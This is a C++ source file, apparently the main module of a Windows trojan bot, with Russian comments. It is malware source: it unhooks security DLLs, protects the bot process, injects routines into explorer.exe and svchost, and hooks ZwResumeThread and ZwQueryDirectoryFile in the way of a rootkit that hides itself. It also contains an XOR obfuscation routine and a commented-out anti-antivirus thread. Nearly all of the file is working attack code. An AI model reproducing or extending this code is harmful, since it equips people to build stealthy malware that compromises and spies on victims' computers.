#include <windows.h>

#include "GetApi.h"
#include "Memory.h"
#include "Strings.h"
#include "DllLoader.h"

#include "Utils.h"

#include "BotUtils.h"
#include "Rootkit.h"
#include "Inject.h"
#include "Unhook.h"
#include "Loader.h"
#include "Config.h"
#include "Crypt.h"

#include "ntdll.h"
#include "BotEvents.h"
#include "Task.h"
#include "md5.h"

#include "Modules.h"


#include "BotDebug.h"


//********************** Отладочные шаблоны **********************************

namespace MAINDBGTEMPLATES
{
	#include "DbgTemplates.h"
}

// Объявляем шаблон вывода отладочных строк
#define MDBG MAINDBGTEMPLATES::DBGOutMessage<>


//***************************************************************************


#pragma comment(linker, "/ENTRY:MyMain" )


DWORD dwKillPid		 = 0; //пид для убийства процесса бота
DWORD dwFirst	     = 0; //запуск в первый раз
DWORD dwAlreadyRun   = 0; //если уже запущены
DWORD dwGrabberRun	 = 0; //отработал ли граббер
DWORD dwExplorerSelf = 0; //если инжект был в собственный эксплорер
//DWORD dwExplorerPid  = 0; //пид эксплорера

//получаем пид эксплорера



DWORD WINAPI LoaderRoutine( LPVOID lpData )
{
	MDBG("Main", "*************** LoaderRoutine ***************");

	UnhookDlls();
	ProtectBot();

	// Отключаем отображение ошибок при крахе процесса
	DisableShowFatalErrorDialog();

	// Вызываем событие
	bool Cancel = false;
	SVChostStart(NULL, Cancel);
	if (Cancel)
	{
		// Убиваем процесс svchost
		pExitProcess(1);
		return 0; // для компилятора
	}


//	DataGrabber::StartDataSender();


	bool FirstSended = false;
	

	return 0;
}


void ExplorerMain()
{
	MDBG("Main", "----------------- ExplorerMain -----------------");

	if ( !dwExplorerSelf )
		UnhookDlls();

	// Отключаем отображение ошибок при крахе процесса
	DisableShowFatalErrorDialog();



	HookZwResumeThread();
	HookZwQueryDirectoryFile();
/*
*/	
	if ( !dwAlreadyRun )
		MegaJump( LoaderRoutine );
	
	

	//MegaJump(AvFuckThread);


	// Вызываем событие мтарта експлорера

	if (dwFirst)
		ExplorerFirstStart(NULL);

	ExplorerStart(NULL);
	MDBG("Main", "----------------- ExplorerMain -----------------");


}

DWORD WINAPI ExplorerRoutine( LPVOID lpData )
{
	UnhookDlls();

	if ( dwExplorerSelf ) //если инжект был в свой эксплорер завершаемся
	{
		dwExplorerSelf = 0;

		if ( !InjectIntoExplorer( ExplorerRoutine ) )
		{
			ExplorerMain();
		}

		pExitProcess( 1 );
	}

	ExplorerMain();
	
	return 0;
}

DWORD LiteCrypt( int Key, LPBYTE lpResult, DWORD dwSize )
{
    DWORD a = 0, b = 0;
    a = 0;
	
    while ( a < dwSize )
    {
        lpResult[ a ] ^= Key; 
        a++; 
    }

	return a;
}


LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);
ATOM RegMyWindowClass(HINSTANCE, LPCTSTR);

////////////////////////////////////////////////////////////////////////// 
// функция вхождений программы WinMain

#include"BotCore.h"
int APIENTRY MyMain() 
{

	
	#if defined(DEBUGBOT) && defined(DebugUtils)
		if (!StartInDebugingMode(true))
			return 0;
	#endif

	UnhookDlls(); //снимаем хуки

	WCHAR ModulePath[ MAX_PATH ];

	pGetModuleFileNameW( NULL, ModulePath, MAX_PATH );
	DWORD dwProcessHash = GetNameHash( ModulePath );

	if ( dwProcessHash == GetBotHash() ) // запуск из самого бота
	{
		
		DWORD dwExploits = 0;

		if ( !dwExploits )
		{
			if ( MegaJump( LoaderRoutine ) )
			{
				dwAlreadyRun = 1;
			}
		}

		dwExplorerSelf = 1;

		if ( !JmpToExplorer( ExplorerRoutine ) )
		{
			dwExplorerSelf = 0;

			if ( !InjectIntoExplorer( ExplorerRoutine ) && !dwAlreadyRun )
			{
				MegaJump( LoaderRoutine );
			}
		}		
	}
	else
	{
		dwFirst = 1;

		
		DWORD dwExploits = 0;

		if ( !dwExploits )
		{
			if ( MegaJump( LoaderRoutine ) )
			{
				dwAlreadyRun = 1;
			}

			
		}
				
		
		dwKillPid = (DWORD)pGetCurrentProcessId();
		

		dwExplorerSelf = 1;

		if ( !JmpToExplorer( ExplorerRoutine ) )
		{
			dwExplorerSelf = 0;

		}
	}
	pExitProcess( 1 );
	return 0;
}